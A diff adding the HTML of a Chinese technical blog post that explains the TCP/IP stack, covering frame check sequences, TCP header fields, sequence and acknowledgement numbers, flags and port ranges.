@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="//img.to2b.cn/blog/ljk/1607154764582.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="//img.to2b.cn/blog/ljk/1607154764582.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="//img.to2b.cn/blog/ljk/1607154764582.png">
+  <link rel="mask-icon" href="//img.to2b.cn/blog/ljk/1607154764582.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//s1.to2b.cn/libs/fontawesome-free/5.15.4/css/all.min.css">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.lujinkai.cn","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.16.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":10},"copycode":{"enable":true,"style":"flat"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"algolia":{"appID":"KN3H1V8A6V","apiKey":"c5d73d0dde2dd770ce49b505f938553d","indexName":"hexo","hits":{"per_page":20,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}}}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="TCP&#x2F;IP 是一个协议栈，包括 TCP、IP、UDP、ICMP、RIP、TELNET、FTP、SMTP、ARP 等许多协议   TCP&#x2F;IP 通信过程  FCS：Frame Check Sequence（帧校验序列），俗称帧尾，即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段 4 个字节的循环冗余校验码。 源节点发送数据帧时，由帧的帧头和数据部分计算得出 FCS，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCP&#x2F;IP协议栈">
+<meta property="og:url" content="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/index.html">
+<meta property="og:site_name" content="LJKのBlog">
+<meta property="og:description" content="TCP&#x2F;IP 是一个协议栈，包括 TCP、IP、UDP、ICMP、RIP、TELNET、FTP、SMTP、ARP 等许多协议   TCP&#x2F;IP 通信过程  FCS：Frame Check Sequence（帧校验序列），俗称帧尾，即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段 4 个字节的循环冗余校验码。 源节点发送数据帧时，由帧的帧头和数据部分计算得出 FCS，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598179886936.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598179995961.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598180983421.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598194206270.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1613529950598.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1613529829069.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598322188545.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598341151668.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1600676241594.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1600938679478.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1600938925363.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1613533292143.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598355062997.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598357957585.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598361685849.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598365287677.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598365326536.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1616987648967.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598406043275.png">
+<meta property="og:image" content="http://img.to2b.cn/blog/ljk/1598407472082.png">
+<meta property="article:published_time" content="2021-01-01T14:37:52.000Z">
+<meta property="article:modified_time" content="2023-05-29T08:58:05.510Z">
+<meta property="article:author" content="像方便面一样的男子">
+<meta property="article:tag" content="网络">
+<meta property="article:tag" content="TCP&#x2F;IP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.to2b.cn/blog/ljk/1598179886936.png">
+
+
+<link rel="canonical" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/","path":"运维/基础/网络/TCPIP协议栈/","title":"TCP/IP协议栈"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>TCP/IP协议栈 | LJKのBlog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">LJKのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">学无止境</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container">
+  <div class="algolia-stats"><hr></div>
+  <div class="algolia-hits"></div>
+  <div class="algolia-pagination"></div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP-x2F-IP-%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">TCP&#x2F;IP 通信过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82"><span class="nav-number">2.</span> <span class="nav-text">传输层</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-%E5%8C%85%E5%A4%B4%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.</span> <span class="nav-text">TCP 包头结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-%E5%8D%8F%E8%AE%AE-PORT"><span class="nav-number">2.2.</span> <span class="nav-text">TCP 协议 PORT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B"><span class="nav-number">2.3.</span> <span class="nav-text">TCP 三次握手</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E4%B8%AD-seq-%E5%92%8C-ack"><span class="nav-number">2.3.1.</span> <span class="nav-text">三次握手过程中 seq 和 ack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sync-%E5%8D%8A%E8%BF%9E%E6%8E%A5%E5%92%8C-accept-%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97"><span class="nav-number">2.3.2.</span> <span class="nav-text">sync 半连接和 accept 全连接队列</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B%E4%B8%AD-TCP-%E7%8A%B6%E6%80%81"><span class="nav-number">2.3.3.</span> <span class="nav-text">三次握手过程中 TCP 状态</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B"><span class="nav-number">2.4.</span> <span class="nav-text">TCP 四次挥手</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E8%BF%87%E7%A8%8B%E4%B8%AD-TCP-%E7%8A%B6%E6%80%81"><span class="nav-number">2.4.1.</span> <span class="nav-text">四次挥手过程中 TCP 状态</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcp-%E7%8A%B6%E6%80%81%E4%BB%A5%E5%8F%8A%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2"><span class="nav-number">2.5.</span> <span class="nav-text">tcp 状态以及状态转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcp-%E8%B6%85%E6%97%B6%E9%87%8D%E4%BC%A0"><span class="nav-number">2.6.</span> <span class="nav-text">tcp 超时重传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6"><span class="nav-number">2.7.</span> <span class="nav-text">拥塞控制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcp-%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E4%BC%98%E5%8C%96"><span class="nav-number">2.8.</span> <span class="nav-text">tcp 内核参数优化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP"><span class="nav-number">2.9.</span> <span class="nav-text">UDP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82"><span class="nav-number">3.</span> <span class="nav-text">网络层</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ICMP"><span class="nav-number">3.1.</span> <span class="nav-text">ICMP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%8F%AF%E8%BE%BE%EF%BC%88Destination-Unreachable%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">目的不可达（Destination Unreachable）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B6%85%E6%97%B6%EF%BC%88Time-Exceeded%EF%BC%89"><span class="nav-number">3.1.2.</span> <span class="nav-text">超时（Time Exceeded）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E9%94%99%E8%AF%AF%E6%8A%A5%E6%96%87%EF%BC%88Parameter-Problem%EF%BC%89"><span class="nav-number">3.1.3.</span> <span class="nav-text">参数错误报文（Parameter Problem）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E5%86%B7%E5%8D%B4%EF%BC%88Source-Quench%EF%BC%89"><span class="nav-number">3.1.4.</span> <span class="nav-text">源冷却（Source Quench）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%EF%BC%88Redirect%EF%BC%89"><span class="nav-number">3.1.5.</span> <span class="nav-text">重定向（Redirect）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%9B%9E%E6%98%BE%E6%88%96%E5%9B%9E%E6%98%BE%E5%BA%94%E7%AD%94%EF%BC%88Echo-or-Echo-Reply%EF%BC%89"><span class="nav-number">3.1.6.</span> <span class="nav-text">请求回显或回显应答（Echo or Echo Reply）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E6%88%B3%E6%88%96%E6%97%B6%E9%97%B4%E6%88%B3%E8%AF%B7%E6%B1%82%EF%BC%88Timestamp-or-Timestamp-Reply%EF%BC%89"><span class="nav-number">3.1.7.</span> <span class="nav-text">时间戳或时间戳请求（Timestamp or Timestamp Reply）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E8%AF%B7%E6%B1%82%E6%88%96%E4%BF%A1%E6%81%AF%E5%93%8D%E5%BA%94%EF%BC%88Info-Request-or-Info-Reply%EF%BC%89"><span class="nav-number">3.1.8.</span> <span class="nav-text">信息请求或信息响应（Info Request or Info Reply）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E6%8E%A9%E7%A0%81%E8%AF%B7%E6%B1%82-%E5%92%8C-%E5%9C%B0%E5%9D%80%E6%8E%A9%E7%A0%81%E5%93%8D%E5%BA%94%EF%BC%88Address-Mask-Request-or-Address-Mask-Reply%EF%BC%89"><span class="nav-number">3.1.9.</span> <span class="nav-text">地址掩码请求 和 地址掩码响应（Address Mask Request or Address Mask Reply）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP"><span class="nav-number">3.2.</span> <span class="nav-text">ARP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Gratuitous-ARP"><span class="nav-number">3.2.1.</span> <span class="nav-text">Gratuitous ARP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RARP"><span class="nav-number">3.3.</span> <span class="nav-text">RARP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IP-%E5%8C%85%E5%A4%B4"><span class="nav-number">3.4.</span> <span class="nav-text">IP 包头</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%88%B0%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8C%85%E4%BC%A0%E9%80%92%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">主机到主机的包传递完整过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP"><span class="nav-number">5.</span> <span class="nav-text">IP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IP-%E5%9C%B0%E5%9D%80%E7%BB%84%E6%88%90"><span class="nav-number">5.1.</span> <span class="nav-text">IP 地址组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IP-%E5%9C%B0%E5%9D%80%E5%88%86%E7%B1%BB"><span class="nav-number">5.2.</span> <span class="nav-text">IP 地址分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E7%B1%BB"><span class="nav-number">5.2.1.</span> <span class="nav-text">无类</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AC%E6%9C%89%E5%92%8C%E7%A7%81%E6%9C%89-IP-%E5%9C%B0%E5%9D%80"><span class="nav-number">5.3.</span> <span class="nav-text">公有和私有 IP 地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%9C%B0%E5%9D%80"><span class="nav-number">5.4.</span> <span class="nav-text">特殊地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E7%95%99%E5%9C%B0%E5%9D%80"><span class="nav-number">5.5.</span> <span class="nav-text">保留地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81-netmask"><span class="nav-number">5.6.</span> <span class="nav-text">子网掩码 netmask</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AF%B9%E6%96%B9%E4%B8%BB%E6%9C%BA%E6%98%AF%E5%90%A6%E5%9C%A8%E5%90%8C%E4%B8%80%E7%BD%91%E6%AE%B5%EF%BC%9A"><span class="nav-number">5.6.1.</span> <span class="nav-text">判断对方主机是否在同一网段：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%92%E5%88%86%E5%AD%90%E7%BD%91-Subnet"><span class="nav-number">5.7.</span> <span class="nav-text">划分子网 Subnet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%98%E5%8C%96-IP-%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D"><span class="nav-number">5.8.</span> <span class="nav-text">优化 IP 地址分配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%A8%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1"><span class="nav-number">5.9.</span> <span class="nav-text">跨网络通信</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AE-DHCP"><span class="nav-number">5.10.</span> <span class="nav-text">动态主机配置协议 DHCP</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="像方便面一样的男子"
+      src="//img.to2b.cn/blog/ljk/1607154764582.png">
+  <p class="site-author-name" itemprop="name">像方便面一样的男子</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">340</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">99</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ljkk" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ljkk" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
+      <meta itemprop="name" content="像方便面一样的男子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LJKのBlog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="TCP/IP协议栈 | LJKのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TCP/IP协议栈
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-01 22:37:52" itemprop="dateCreated datePublished" datetime="2021-01-01T22:37:52+08:00">2021-01-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">基础</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%BF%90%E7%BB%B4/%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>TCP&#x2F;IP 是一个协议栈，包括 TCP、IP、UDP、ICMP、RIP、TELNET、FTP、SMTP、ARP 等许多协议</p>
+<img data-src="//img.to2b.cn/blog/ljk/1598179886936.png" style="zoom:50%;" />
+
+<h2 id="TCP-x2F-IP-通信过程"><a href="#TCP-x2F-IP-通信过程" class="headerlink" title="TCP&#x2F;IP 通信过程"></a>TCP&#x2F;IP 通信过程</h2><img data-src="//img.to2b.cn/blog/ljk/1598179995961.png" style="zoom: 50%;" />
+
+<p>FCS：Frame Check Sequence（帧校验序列），俗称帧尾，即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段 4 个字节的循环冗余校验码。</p>
+<p>源节点发送数据帧时，由帧的帧头和数据部分计算得出 FCS，目的节点接收到后，用同样的方式再计算一遍 FCS，如果与接收到的 FCS 不同，则认为帧在传输过程中发生了错误，从而选择丢弃这个帧。</p>
+<p>FCS 提供了一种错误检测机制，用来验证帧在传输过程中的完整性。</p>
+<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="TCP-包头结构"><a href="#TCP-包头结构" class="headerlink" title="TCP 包头结构"></a>TCP 包头结构</h3><p><img data-src="//img.to2b.cn/blog/ljk/1598180983421.png"></p>
+<ul>
+<li><p>源端口、目标端口：源端口一般是随机的、动态的，范围默认是 49152-65535，&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range 中可以配置；目标端口是预设的，例如 http 服务一般是 80，https 服务一般是 443。</p>
+</li>
+<li><p>序列号：表示本报文段所发送数据的第一个字节的编号。在 TCP 连接中所传送的字节流的每一个字节都会按顺序编号。由于序列号由 32 位表示，所以每 2^32 个字节，就会出现序列号回绕，再次从 0 开始</p>
+<p><strong>seq 是我现在位置，next seq 是对方成功接收到报文后我要去的位置，ack 是确认对方位置，并希望对方下次从这个位置开始发送信息。</strong></p>
+<p>A 发送”hello”给 B<code>seq 1 next seq 7 ack 1</code>，B 接收到”hello” 回复 <code>seq 1 next seq 1 ack 7</code>；<br><font color=red>A：我当前位置 1（seq），发你 6 个字节，如果你收到了我就去位置 7（nex seq），确认一下：你现在在 1 吗（ack）</font><br><font color=red>B：我当前位置 1（seq），因为这次我没有发送信息，只是回复确认我收到消息了，所以发完这条回复后 我还在 1（next seq），确认一下：你现在在 7 吗（ack）</font><br><font color=red>A 收到回复，默默去了 7</font><br>B 发送”hello too”给 A seq 1 next seq 11 ack 7，A 接收到”hello too” 回复 seq 7 next seq 7 ack 11；<br><font color=red>B：我在 1，你收到 hello too 我就去 11，你在 7 吗</font><br><font color=red>A：我在 7，你收到这条消息后我还在 7，数据我收到了，你去 11 吧</font><br><font color=red>B 收到回复，默默去了 11</font><br>A 发送”hello too too”给 B seq 7 next seq 21 ack 11，B 接收到”hello too too” 回复 seq 11 next seq 11 ack 21；</p>
+</li>
+<li><p>确认号：ack 表示接收方期望收到发送方下一个报文段的第一个字节数据的编号。也就是告诉发送方：我希望你（指发送方）下次发送的数据的第一个字节数据的编号</p>
+</li>
+<li><p>数据偏移：表示 TCP 首部的长度，该字段占 4bit，取最大的 1111 时，也就是十进制的 15，TCP 首部的偏移单位为 4byte，那么 TCP 首部长度最长为 15*4&#x3D;60 字节。</p>
+</li>
+<li><p>保留</p>
+</li>
+<li><p>URG：紧急位，后面的紧急指针只有在 URG&#x3D;1 时才生效</p>
+</li>
+<li><p>ACK：确认位，<em>Ack</em>nowledge character，若 ACK&#x3D;1，则表示前面的确认号有效，TCP 规定，连接建立后，ACK 必须为 1,带 ACK 标志的 TCP 报文段称为确认报文段，注意不要和上面的 ack 搞混，上面那个确认号，这个是确认位，在 tcp 包头的位置不一样。</p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1598194206270.png"></p>
+</li>
+<li><p>PSH：push，提示接收端应用程序应该立即从 TCP 接收缓冲区中读走数据，为接收后续数据腾出空间。如果为 1，则表示对方应当立即把数据提交给上层应用，而不是缓存起来，如果应用程序不将接收到的数据读走，就会一直停留在 TCP 接收缓冲区中</p>
+</li>
+<li><p>RST：如果收到一个 RST&#x3D;1 的报文，说明与主机的连接出现了严重错误（如主机崩溃），必须释放连接，然后再重新建立连接。或者说明上次发送给主机的数据有问题，主机拒绝响应，带 RST 标志的 TCP 报文段称为复位报文段</p>
+</li>
+<li><p>SYN：同步位，在建立连接时使用，用来同步序号。当 SYN&#x3D;1，ACK&#x3D;0 时，表示这是一个请求建立连接的报文段；当 SYN&#x3D;1，ACK&#x3D;1 时，表示对方同意建立连接。SYN&#x3D;1，说明这是一个请求建立连接或同意建立连接的报文。只有在前两次握手中 SYN 才置为 1，带 SYN 标志的 TCP 报文段称为同步报文段</p>
+</li>
+<li><p>FIN：终止位，表示通知对方本端要关闭连接了，标记数据是否发送完毕。如果 FIN&#x3D;1，即告诉对方：“我的数据已经发送完毕，你可以释放连接了”，带 FIN 标志的 TCP 报文段称为结束报文段</p>
+</li>
+<li><p>窗口大小：表示现在允许对方发送的数据量，也就是告诉对方，从本报文段的确认号开始允许对方发送的数据量，达到此值，需要 ACK 确认后才能再继续传送后面数据，由 Window size value *Window size scaling factor（此值在三次握手阶段 TCP 选项 Window scale 协商得到）得出此值</p>
+</li>
+<li><p>校验和：校验整个 TCP 报文段，提供额外的可靠性</p>
+</li>
+<li><p>紧急指针：标记紧急数据在 TCP 数据部分中的位置</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoting451292510/article/details/102756146">选项部分</a>：选项部分是 TCP 为了适应复杂的网络环境和更好的服务应用层而进行设计的，因为 TCP 首部最长 60 字节，所以选项部分最长 40 字节。常见的选项：</p>
+<ul>
+<li>最大报文段长度 MSS（Maximum Segment Size），通常 1460 字节</li>
+<li>窗口扩大 Window Scale</li>
+<li>时间戳 Timestamps</li>
+</ul>
+</li>
+<li><p>填充：填充是为了使 TCP 首部为 4byte 的整数倍。</p>
+</li>
+</ul>
+<h3 id="TCP-协议-PORT"><a href="#TCP-协议-PORT" class="headerlink" title="TCP 协议 PORT"></a>TCP 协议 PORT</h3><p>传输层通过 port 号，确定应用层协议，范围 0-65535，FTP：21、Telnet：23、HTTP：80、DNS：53、TFTP：69、SNMP：161</p>
+<ul>
+<li>0-1023：系统端口或特权端口（仅管理员可用），永久的分配给固定的系统应用使用，22&#x2F;tcp（ssh）, 80&#x2F;tcp（http）、443&#x2F;tcp（https）</li>
+<li>1024-49151：用户端口或注册端口，但要求并不严格，分配给程序注册为某应用使用，1433&#x2F;tcp（SqlServer）、1521&#x2F;tcp（oracle）、3306&#x2F;tcp（mysql）、11211&#x2F;tcp&#x2F;udp（memcached）</li>
